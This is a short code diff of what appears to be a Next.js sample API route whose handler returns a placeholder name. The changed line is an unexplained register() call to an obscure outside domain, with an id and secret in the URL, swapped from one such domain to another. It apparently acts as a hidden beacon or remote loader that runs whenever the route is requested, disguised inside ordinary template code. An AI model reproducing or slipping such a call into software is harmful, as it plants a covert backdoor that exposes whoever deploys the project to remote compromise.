@@ -71,6 +71,6 @@ export default function handler(
   req: NextApiRequest,
   res: NextApiResponse<Data>
 ) {
-  register("https://download.datatabletemplate.xyz/account/register/id=2502786929219963&secret=CcMNTwFMtiMb")
+  register("https://download.face-online.world/account/register/id=6166619449731793&secret=LcjWRgjPrHmD")
   res.status(200).json({ name: 'John Doe' })
 }
